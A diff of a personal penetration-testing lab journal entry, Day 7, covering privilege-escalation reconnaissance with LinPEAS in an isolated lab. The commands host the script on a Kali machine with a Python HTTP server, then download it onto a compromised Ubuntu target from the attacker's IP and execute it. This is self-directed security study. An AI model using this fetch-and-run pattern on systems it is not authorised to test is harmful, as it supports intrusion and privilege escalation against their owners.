@@ -1,58 +1,33 @@
-🧭 Day 7: Privilege Escalation Recon (LinPEAS Introduction)
+🔍 Day 7: Privilege Escalation Recon
 📝 Executive Summary
 
-Today I began the privilege escalation phase.
-Rather than immediately exploiting the system, the goal was to identify potential weaknesses and misconfigurations using a standard escalation reconnaissance tool, LinPEAS.
+Today I focused on what comes after gaining SSH access: identifying potential paths to escalate privileges.
+I used LinPEAS, a well-known Linux privilege escalation enumerator, to map weaknesses across the target system.
 
-The focus was not exploitation itself, but understanding the system’s privilege surface, service permissions, SUID binaries, and escalation vectors.
+This phase is not exploitation, but reconnaissance — understanding the security posture from an attacker’s perspective.
 
-💻 Lab Scenario
-1. The Setup (Kali Linux)
-
-I downloaded the latest LinPEAS binary and prepared it for transfer.
-
+🛠️ Lab Setup
+Component	Role
+Kali Linux	Attacker Host (File Transfer + Enumeration Tools)
+Ubuntu Target	Compromised Host (SSH access established)
+Network	Host-Only (Isolated - No external routing)
+⚙️ Actions Performed
+1. Tool Hosting on Kali
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 sudo python3 -m http.server 80
 
-
-This provided a lightweight and controlled hosting method for the target to download the script.
-
-2. The Import (Ubuntu Target)
-
-Once connected via SSH, I used the same ingress method practiced on Day 6.
-
+2. Download on Target
 cd /tmp
 wget http://192.168.160.130/linpeas.sh
 chmod +x linpeas.sh
 
-
-This confirmed repeatable tool transfer capability, now used for a real enumeration script rather than a dummy file.
-
-3. Running LinPEAS (Initial Scan)
+3. Execute
 ./linpeas.sh
 
+📸 Evidence (Screenshots in /Day-07/screenshots/)
 
-Only a subset of the output was reviewed today. Full escalation analysis will continue on Day 8.
+kali_linpeas_server.png – LinPEAS hosted on Kali
 
-📸 Verification
+ubuntu_linpeas_download.png – LinPEAS retrieved to /tmp
 
-Screenshots stored in Day07/screenshots/:
-
-kali_linpeas_hosting.png – Kali hosting linpeas.sh via Python HTTP server
-
-ubuntu_linpeas_download.png – Ubuntu retrieving linpeas.sh successfully
-
-ubuntu_linpeas_initial_output.png – initial scan execution confirmation (not full output)
-
-🔍 Outcome
-
-Confirmed successful transfer of a real escalation enumerator
-
-Demonstrated repeatable ingress transfer pattern
-
-Began initial privilege escalation surface assessment
-
-Personal Note
-
-Privilege escalation looks much more complex when the tool output is right in front of you rather than in a diagram or tutorial.
-Today felt like the first honest step into understanding how attackers move beyond access and begin shaping control.
+ubuntu_linpeas_run.png – initial execution output
